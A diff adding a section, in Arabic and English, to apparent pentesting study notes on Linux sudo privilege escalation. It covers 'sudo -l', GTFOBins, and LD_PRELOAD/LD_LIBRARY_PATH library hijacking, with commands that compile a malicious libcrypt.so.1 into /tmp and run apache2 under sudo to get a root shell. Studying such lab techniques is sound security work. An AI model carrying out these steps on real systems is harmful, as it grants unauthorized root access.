@@ -184,9 +184,82 @@ Used responsibly, this is a great example of **local privilege escalation** via 
 
 
 
+<details>
+  <summary>Sudo</summary>
+
+
+* <details>
+     <summary>Shell Escape Sequences</summary>
+
+    * `sudo -l`
+    * (عرض الأوامر التي يمكن تشغيلها باستخدام Sudo بدون الحاجه لادخال كلمه مرور)
+  
+
+    * **`gtfobins.github.io`**
+    * (البحث في gtfobins عن أوامر قابلة للاستغلال)
+
+     
+  </details>
+
+
+* <details>
+     <summary>Environment Variables</summary>
+
+   * **Environment Variables:** `(LD_LIBRARY_PATH - LD_PRELOAD)`
+    * (يمكن نستغل الـ Environment variables دي)
+    * **شرح بسيط:** (عشان أي برنامج يعمل لابد يحتاج الى تحميل مكتبات مشتركه لتنفيذ وظائف معينه أماكن هذه المكتبات `Lib` أو `/usr/lib`)
+    * (هذه المتغيرات تتحكم في كيف وأين يبحث البرنامج عن مكتبات نقدر نستغلها علشان نوصل بيها للـ root)
+
+
+    >[!warning] ⚠️⚠️
+    >
+    > لو عملنا مكتبه تحتوى على كود خبيث (مثلا كود بيفتح `root shell`)
+    >
+    > وجعلنا **_`LD_PRELOAD`_** يشير اليها فان :
+    >
+    > اى برنامج يتم تشغيله بصلاحيات ال ``SUDO`` هيقوم اولا بتحميل المكتبه الخبيثه التى انشاناها مم يعطيك صلاحيات ``ROOT``
 
 
 
+   This method works if `LD_LIBRARY_PATH` is inherited. It tells a program to look for shared libraries in a specified directory first, allowing you to hijack a library call.
+
+   1.  **Find a target library:**
+       * Use `ldd` to see which shared libraries a program uses.
+
+       ```bash
+       ldd /usr/sbin/apache2
+       ```
+
+   2.  **Create a malicious shared object:**
+       * Compile the C code from `/home/user/tools/sudo/library_path.c`.
+       * **Crucially, name the output file the same as one of the libraries used by the target program** (e.g., `libcrypt.so.1`).
+
+       ```bash
+       gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
+       ```
+
+    3.  **Run the program with `LD_LIBRARY_PATH`:**
+        * Execute the program using sudo, setting `LD_LIBRARY_PATH` to the directory containing your malicious library (`/tmp`).
+
+        ```bash
+        sudo LD_LIBRARY_PATH=/tmp apache2
+        ```
+  
+    * This should also spawn a root shell because the program loads your malicious `libcrypt.so.1` instead of the real one.
+
+   #### **Further thought / exercise:**
+
+   * Try renaming `/tmp/libcrypt.so.1` to the name of another library used by `apache2` and re-run the exploit. Does it still work? If not, why? How would the        `library_path.c` code need to be changed to make it work with a different library?
+
+
+
+  </details>
+
+  
+</details>
+
+
+ 
 
 
 
